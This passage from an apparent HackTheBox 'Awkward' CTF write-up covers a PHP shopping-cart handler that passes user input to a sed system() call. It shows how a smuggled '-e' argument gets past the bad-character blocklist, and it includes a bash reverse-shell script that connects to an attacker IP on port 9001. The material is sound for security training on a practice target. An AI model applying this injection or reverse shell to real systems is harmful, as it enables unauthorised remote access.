<span class="line"><span style="color:#6A737D">//delete from cart</span></span>
<span class="line"><span style="color:#B392F0">if</span><span style="color:#E1E4E8"> ($_SERVER[</span><span style="color:#9ECBFF">&#39;REQUEST_METHOD&#39;</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">===</span><span style="color:#9ECBFF"> &#39;POST&#39;</span><span style="color:#F97583"> &amp;&amp;</span><span style="color:#E1E4E8"> $_POST[</span><span style="color:#9ECBFF">&#39;action&#39;</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">===</span><span style="color:#9ECBFF"> &#39;delete_item&#39;</span><span style="color:#F97583"> &amp;&amp;</span><span style="color:#E1E4E8"> $_POST[</span><span style="color:#9ECBFF">&#39;item&#39;</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">&amp;&amp;</span><span style="color:#E1E4E8"> $_POST[</span><span style="color:#9ECBFF">&#39;user&#39;</span><span style="color:#E1E4E8">]) {</span></span>
<span class="line"><span style="color:#E1E4E8">    $item_id </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_POST[</span><span style="color:#9ECBFF">&#39;item&#39;</span><span style="color:#E1E4E8">];</span></span>
<span class="line"><span style="color:#E1E4E8">    $user_id </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_POST[</span><span style="color:#9ECBFF">&#39;user&#39;</span><span style="color:#E1E4E8">];</span></span>
<span class="line"><span style="color:#E1E4E8">    $bad_chars </span><span style="color:#F97583">=</span><span style="color:#B392F0"> array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;;&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;&amp;&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;|&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;&gt;&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;&lt;&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;*&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;?&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;`&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;$&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;(&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;)&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;{&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;}&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;[&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;]&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;!&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;#&quot;</span><span style="color:#E1E4E8">); </span><span style="color:#6A737D">//no hacking allowed!!</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">    foreach</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">$bad_chars</span><span style="color:#FFAB70"> as</span><span style="color:#FFAB70"> $bad</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">strpos</span><span style="color:#E1E4E8">($item_id, $bad) </span><span style="color:#F97583">!==</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#E1E4E8">            echo </span><span style="color:#9ECBFF">&quot;Bad character detected!&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">            exit;</span></span>
<span class="line"><span style="color:#E1E4E8">        }</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">    foreach</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">$bad_chars</span><span style="color:#FFAB70"> as</span><span style="color:#FFAB70"> $bad</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">strpos</span><span style="color:#E1E4E8">($user_id, $bad) </span><span style="color:#F97583">!==</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#E1E4E8">            echo </span><span style="color:#9ECBFF">&quot;Bad character detected!&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">            exit;</span></span>
<span class="line"><span style="color:#E1E4E8">        }</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"><span style="color:#B392F0">    if</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">checkValidItem</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;{$STORE_HOME}cart/{$user_id}&quot;</span><span style="color:#E1E4E8">)) {</span></span>
<span class="line"><span style="color:#B392F0">        system</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;sed -i &#39;/item_id={$item_id}/d&#39; {$STORE_HOME}cart/{$user_id}&quot;</span><span style="color:#E1E4E8">);</span></span>
<span class="line"><span style="color:#E1E4E8">        echo </span><span style="color:#9ECBFF">&quot;Item removed from cart&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"><span style="color:#E1E4E8">    else {</span></span>
<span class="line"><span style="color:#E1E4E8">        echo </span><span style="color:#9ECBFF">&quot;Invalid item&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"><span style="color:#E1E4E8">    exit;</span></span>
<span class="line"><span style="color:#E1E4E8">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6A737D">//fetch from cart</span></span>
<span class="line"><span style="color:#B392F0">if</span><span style="color:#E1E4E8"> ($_SERVER[</span><span style="color:#9ECBFF">&#39;REQUEST_METHOD&#39;</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">===</span><span style="color:#9ECBFF"> &#39;GET&#39;</span><span style="color:#F97583"> &amp;&amp;</span><span style="color:#E1E4E8"> $_GET[</span><span style="color:#9ECBFF">&#39;action&#39;</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">===</span><span style="color:#9ECBFF"> &#39;fetch_items&#39;</span><span style="color:#F97583"> &amp;&amp;</span><span style="color:#E1E4E8"> $_GET[</span><span style="color:#9ECBFF">&#39;user&#39;</span><span style="color:#E1E4E8">]) {</span></span>
<span class="line"><span style="color:#E1E4E8">    $html </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> &quot;&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">    $dir </span><span style="color:#F97583">=</span><span style="color:#B392F0"> scandir</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;{$STORE_HOME}cart&quot;</span><span style="color:#E1E4E8">);</span></span>
<span class="line"><span style="color:#E1E4E8">    $files </span><span style="color:#F97583">=</span><span style="color:#B392F0"> array_slice</span><span style="color:#E1E4E8">($dir, </span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">    foreach</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">$files</span><span style="color:#FFAB70"> as</span><span style="color:#FFAB70"> $file</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#E1E4E8">        $user_id </span><span style="color:#F97583">=</span><span style="color:#B392F0"> substr</span><span style="color:#E1E4E8">($file, </span><span style="color:#F97583">-</span><span style="color:#79B8FF">18</span><span style="color:#E1E4E8">);</span></span>
<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">($user_id </span><span style="color:#F97583">===</span><span style="color:#E1E4E8"> $_GET[</span><span style="color:#9ECBFF">&#39;user&#39;</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">&amp;&amp;</span><span style="color:#B392F0"> checkValidItem</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;{$STORE_HOME}cart/{$user_id}&quot;</span><span style="color:#E1E4E8">)) {</span></span>
<span class="line"><span style="color:#E1E4E8">            $product_file </span><span style="color:#F97583">=</span><span style="color:#B392F0"> fopen</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;{$STORE_HOME}cart/{$file}&quot;</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">&quot;r&quot;</span><span style="color:#E1E4E8">);</span></span>
<span class="line"><span style="color:#E1E4E8">            $details </span><span style="color:#F97583">=</span><span style="color:#B392F0"> array</span><span style="color:#E1E4E8">();</span></span>
<span class="line"><span style="color:#F97583">            while</span><span style="color:#E1E4E8"> (($line </span><span style="color:#F97583">=</span><span style="color:#B392F0"> fgets</span><span style="color:#E1E4E8">($product_file)) </span><span style="color:#F97583">!==</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#F97583">                if</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">str_replace</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;</span><span style="color:#79B8FF">\r</span><span style="color:#9ECBFF">&quot;</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">&quot;</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">&quot;</span><span style="color:#E1E4E8">), </span><span style="color:#9ECBFF">&#39;&#39;</span><span style="color:#E1E4E8">, $line) </span><span style="color:#F97583">!==</span><span style="color:#9ECBFF"> &quot;***Hat Valley Cart***&quot;</span><span style="color:#E1E4E8">) { </span><span style="color:#6A737D">//don&#39;t include first line</span></span>
<span class="line"><span style="color:#B392F0">                    array_push</span><span style="color:#E1E4E8">($details, </span><span style="color:#B392F0">str_replace</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;</span><span style="color:#79B8FF">\r</span><span style="color:#9ECBFF">&quot;</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">&quot;</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">&quot;</span><span style="color:#E1E4E8">), </span><span style="color:#9ECBFF">&#39;&#39;</span><span style="color:#E1E4E8">, $line));</span></span>
<span class="line"><span style="color:#E1E4E8">                }</span></span>
<span class="line"><span style="color:#E1E4E8">            }</span></span>
<span class="line"><span style="color:#B392F0">            foreach</span><span style="color:#E1E4E8">($details </span><span style="color:#F97583">as</span><span style="color:#B392F0"> $cart_item</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#E1E4E8">                 $cart_items </span><span style="color:#F97583">=</span><span style="color:#B392F0"> explode</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;&amp;&quot;</span><span style="color:#E1E4E8">, $cart_item);</span></span>
<span class="line"><span style="color:#F97583">                 for</span><span style="color:#E1E4E8">($x </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; $x </span><span style="color:#F97583">&lt;</span><span style="color:#B392F0"> count</span><span style="color:#E1E4E8">($cart_items); $x</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#E1E4E8">                      $cart_items[$x] </span><span style="color:#F97583">=</span><span style="color:#B392F0"> explode</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;=&quot;</span><span style="color:#E1E4E8">, $cart_items[$x]); </span><span style="color:#6A737D">//key and value as separate values in subarray</span></span>
<span class="line"><span style="color:#E1E4E8">                 }</span></span>
<span class="line"><span style="color:#E1E4E8">                 $html .</span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> &quot;&lt;tr&gt;&lt;td&gt;{$cart_items[1][1]}&lt;/td&gt;&lt;td&gt;{$cart_items[2][1]}&lt;/td&gt;&lt;td&gt;{$cart_items[3][1]}&lt;/td&gt;&lt;td&gt;&lt;button data-id={$cart_items[0][1]} onclick=</span><span style="color:#79B8FF">\&quot;</span><span style="color:#9ECBFF">removeFromCart(this, localStorage.getItem(&#39;user&#39;))</span><span style="color:#79B8FF">\&quot;</span><span style="color:#9ECBFF"> class=&#39;remove-item&#39;&gt;Remove&lt;/button&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">            }</span></span>
<span class="line"><span style="color:#E1E4E8">        }</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"><span style="color:#E1E4E8">    echo $html;</span></span>
<span class="line"><span style="color:#E1E4E8">    exit;</span></span>
<span class="line"><span style="color:#E1E4E8">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583">?&gt;</span></span></code></pre>
<h2 id="remote-code-execution-rce">Remote Code Execution (RCE)</h2>
<p>While checking the file, I notice this <code>sed</code> command to use to delete the <code>cart</code> file data, which we can use to get <code>RCE</code></p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#F97583">&lt;?</span><span style="color:#E1E4E8">php</span></span>
<span class="line"><span style="color:#6A737D">//delete from cart</span></span>
<span class="line"><span style="color:#B392F0">if</span><span style="color:#E1E4E8"> ($_SERVER[</span><span style="color:#9ECBFF">&#39;REQUEST_METHOD&#39;</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">===</span><span style="color:#9ECBFF"> &#39;POST&#39;</span><span style="color:#F97583"> &amp;&amp;</span><span style="color:#E1E4E8"> $_POST[</span><span style="color:#9ECBFF">&#39;action&#39;</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">===</span><span style="color:#9ECBFF"> &#39;delete_item&#39;</span><span style="color:#F97583"> &amp;&amp;</span><span style="color:#E1E4E8"> $_POST[</span><span style="color:#9ECBFF">&#39;item&#39;</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">&amp;&amp;</span><span style="color:#E1E4E8"> $_POST[</span><span style="color:#9ECBFF">&#39;user&#39;</span><span style="color:#E1E4E8">]) {</span></span>
<span class="line"><span style="color:#E1E4E8">    $item_id </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_POST[</span><span style="color:#9ECBFF">&#39;item&#39;</span><span style="color:#E1E4E8">];</span></span>
<span class="line"><span style="color:#E1E4E8">    $user_id </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_POST[</span><span style="color:#9ECBFF">&#39;user&#39;</span><span style="color:#E1E4E8">];</span></span>
<span class="line"><span style="color:#E1E4E8">    $bad_chars </span><span style="color:#F97583">=</span><span style="color:#B392F0"> array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;;&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;&amp;&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;|&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;&gt;&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;&lt;&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;*&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;?&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;`&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;$&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;(&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;)&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;{&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;}&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;[&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;]&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;!&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;#&quot;</span><span style="color:#E1E4E8">); </span><span style="color:#6A737D">//no hacking allowed!!</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">    foreach</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">$bad_chars</span><span style="color:#FFAB70"> as</span><span style="color:#FFAB70"> $bad</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">strpos</span><span style="color:#E1E4E8">($item_id, $bad) </span><span style="color:#F97583">!==</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#E1E4E8">            echo </span><span style="color:#9ECBFF">&quot;Bad character detected!&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">            exit;</span></span>
<span class="line"><span style="color:#E1E4E8">        }</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">    foreach</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">$bad_chars</span><span style="color:#FFAB70"> as</span><span style="color:#FFAB70"> $bad</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">strpos</span><span style="color:#E1E4E8">($user_id, $bad) </span><span style="color:#F97583">!==</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#E1E4E8">            echo </span><span style="color:#9ECBFF">&quot;Bad character detected!&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">            exit;</span></span>
<span class="line"><span style="color:#E1E4E8">        }</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"><span style="color:#B392F0">    if</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">checkValidItem</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;{$STORE_HOME}cart/{$user_id}&quot;</span><span style="color:#E1E4E8">)) {</span></span>
<span class="line"><span style="color:#B392F0">        system</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;sed -i &#39;/item_id={$item_id}/d&#39; {$STORE_HOME}cart/{$user_id}&quot;</span><span style="color:#E1E4E8">); </span><span style="color:#F97583">&lt;-----</span><span style="color:#E1E4E8"> we can abuse the sed command</span></span>
<span class="line"><span style="color:#E1E4E8">        echo </span><span style="color:#9ECBFF">&quot;Item removed from cart&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"><span style="color:#E1E4E8">    else {</span></span>
<span class="line"><span style="color:#E1E4E8">        echo </span><span style="color:#9ECBFF">&quot;Invalid item&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">    }</span></span>
<span class="line"><span style="color:#E1E4E8">    exit;</span></span>
<span class="line"><span style="color:#E1E4E8">}</span></span>
<span class="line"><span style="color:#F97583">?&gt;</span></span></code></pre>
<p>Link : <a href="https://gtfobins.github.io/gtfobins/sed/">https://gtfobins.github.io/gtfobins/sed/</a></p>
<p>As you see in the <code>GTFO</code> bins, we use sed to execute our command, but they are using <code>-n</code> flag which run the command, but we can’t use that because of the <code>Bad character detected</code>
This <code>loop</code> will not allow us to get <code>rev</code> shell</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">$bad_chars </span><span style="color:#F97583">=</span><span style="color:#B392F0"> array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;;&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;&amp;&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;|&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;&gt;&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;&lt;&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;*&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;?&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;`&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;$&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;(&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;)&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;{&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;}&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;[&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;]&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;!&quot;</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">&quot;#&quot;</span><span style="color:#E1E4E8">); </span><span style="color:#6A737D">//no hacking allowed!!</span></span>
<span class="line"><span style="color:#B392F0">foreach</span><span style="color:#E1E4E8">($bad_chars </span><span style="color:#F97583">as</span><span style="color:#B392F0"> $bad</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#F97583">	if</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">strpos</span><span style="color:#E1E4E8">($item_id, $bad) </span><span style="color:#F97583">!==</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#E1E4E8">		echo </span><span style="color:#9ECBFF">&quot;Bad character detected!&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">		exit;</span></span>
<span class="line"><span style="color:#E1E4E8">	}</span></span>
<span class="line"><span style="color:#E1E4E8">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">foreach</span><span style="color:#E1E4E8">($bad_chars </span><span style="color:#F97583">as</span><span style="color:#B392F0"> $bad</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#F97583">	if</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">strpos</span><span style="color:#E1E4E8">($user_id, $bad) </span><span style="color:#F97583">!==</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">) {</span></span>
<span class="line"><span style="color:#E1E4E8">		echo </span><span style="color:#9ECBFF">&quot;Bad character detected!&quot;</span><span style="color:#E1E4E8">;</span></span>
<span class="line"><span style="color:#E1E4E8">		exit;</span></span>
<span class="line"><span style="color:#E1E4E8">	}</span></span>
<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
<p>So we can use <code>-e</code> flag which is given in the help of <code>sed command</code>, this allows us to <code>pass the script</code> where we can write our <code>rev shell</code> code</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#F97583">-</span><span style="color:#E1E4E8">e script, </span><span style="color:#F97583">--</span><span style="color:#E1E4E8">expression</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">script add the script to the commands to be executed</span></span></code></pre>
<p>So let’s talk about how to <code>abuse</code> that sed command</p>
<ul>
<li>First our input look like this <code>&#39; -e &quot;1e /tmp/shell.sh&quot; /tmp/shell.sh &#39;</code></li>
<li>Which will be replaced by <code>$item_id</code></li>
</ul>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#B392F0">system</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;sed -i &#39;/item_id={$item_id}/d&#39; {$STORE_HOME}cart/{$user_id}&quot;</span><span style="color:#E1E4E8">);</span></span></code></pre>
<p>After <code>replacing</code> it’s look like this which close the <code>SUFFIX</code> and add a new flag <code>-e</code> which execute our <code>script</code></p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">$item_id </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> &#39; -e &quot;1e /tmp/shell.sh&quot; /tmp/shell.sh &#39;</span><span style="color:#F97583"> &lt;-----</span><span style="color:#E1E4E8"> our input</span></span>
<span class="line"><span style="color:#B392F0">system</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">&quot;sed -i &#39;/item_id=&#39; -e &quot;</span><span style="color:#E1E4E8">1e </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">tmp</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">shell.sh</span><span style="color:#9ECBFF">&quot; /tmp/shell.sh &#39;/d&#39; {$STORE_HOME}cart/{$user_id}&quot;</span><span style="color:#E1E4E8">); </span><span style="color:#F97583">&lt;-----</span><span style="color:#79B8FF"> this</span><span style="color:#E1E4E8"> will be executed </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> the sed command</span></span></code></pre>
<p>So let’s <code>prepare</code> for that, first let’s create the <code>shell.sh</code> file which give us <code>rev</code> shell</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">bean@</span><span style="color:#B392F0">awkward</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">~</span><span style="color:#E1E4E8">$ chmod </span><span style="color:#F97583">+</span><span style="color:#E1E4E8">x </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">tmp</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">shell.sh</span></span>
<span class="line"><span style="color:#E1E4E8">bean@</span><span style="color:#B392F0">awkward</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">~</span><span style="color:#E1E4E8">$ cat </span><span style="color:#F97583">/</span><span style="color:#E1E4E8">tmp</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">shell.sh</span></span>
<span class="line"><span style="color:#E1E4E8">#</span><span style="color:#F97583">!/</span><span style="color:#E1E4E8">bin</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">bash</span></span>
<span class="line"><span style="color:#E1E4E8">bash </span><span style="color:#F97583">-</span><span style="color:#E1E4E8">i </span><span style="color:#F97583">&gt;&amp;</span><span style="color:#F97583"> /</span><span style="color:#E1E4E8">dev</span><span style="color:#F97583">/</span><span style="color:#E1E4E8">tcp</span><span style="color:#F97583">/</span><span style="color:#79B8FF">10.10</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">XX</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">XX</span><span style="color:#F97583">/</span><span style="color:#79B8FF">9001</span><span style="color:#79B8FF"> 0</span><span style="color:#F97583">&gt;&amp;</span><span style="color:#79B8FF">1</span></span></code></pre>
<p>After that, add a <code>product</code> in the cart</p>
<img loading="lazy" class="border dark:border-[#2e2e2e] border-[#ebebeb] rounded-lg" src="https://wsrv.nl/?url=https://0xdedinfosec-cdn.pages.dev/hackthebox/hackthebox-awkward-writeup/web19.png&output=webp" alt="hackthebox-awkward-writeup" width="1920" height="1080" decoding="async">
<p>Checking that product in the <code>cart/</code> directory, where the file name is same as our <code>userId</code> which will generate randomly</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">bean@</span><span style="color:#B392F0">awkward</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">/var</span><span style="color:#E1E4E8">/www/store$ cat cart/c32c-8d49-752-e3d9</span></span>
<span class="line"><span style="color:#F97583">***</span><span style="color:#E1E4E8">Hat Valley Cart</span><span style="color:#F97583">***</span></span>
<span class="line"><span style="color:#E1E4E8">item_id</span><span style="color:#F97583">=</span><span style="color:#79B8FF">1</span><span style="color:#F97583">&amp;</span><span style="color:#E1E4E8">item_name</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">Yellow Beanie</span><span style="color:#F97583">&amp;</span><span style="color:#E1E4E8">item_brand</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">Good Doggo</span><span style="color:#F97583">&amp;</span><span style="color:#E1E4E8">item_price</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">$39.</span><span style="color:#79B8FF">90</span></span></code></pre>
<ol>
<li>After that we need to remove the file because we <code>can&#39;t edit</code> that file</li>
<li>Then create the same <code>user ID</code> file with same content but with one change which is our <code>item_id</code> parameter which execute our script
Now you may ask why we need to add that <code>content</code> into cart file we just add that content while we’re deleting the cart item inside burp suite</li>
</ol>
<p>The answer is <code>pretty simple</code>, we want to do this extra step because it will check the <code>item_id</code> in the file.
If this is the same as the user <code>input</code> item parameter, then it will move further. Otherwise, it gives us an <code>error</code>.
That’s the reason we want to take that <code>extra step</code>.</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="js"><code><span class="line"><span style="color:#E1E4E8">bean@</span><span style="color:#B392F0">awkward</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">/var</span><span style="color:#E1E4E8">/www/store$ rm -rf cart/c32c-8d49-752-e3d9</span></span>
<span class="line"><span style="color:#E1E4E8">bean@</span><span style="color:#B392F0">awkward</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">/var</span><span style="color:#E1E4E8">/www/store$ nano cart/c32c-8d49-752-e3d9</span></span>
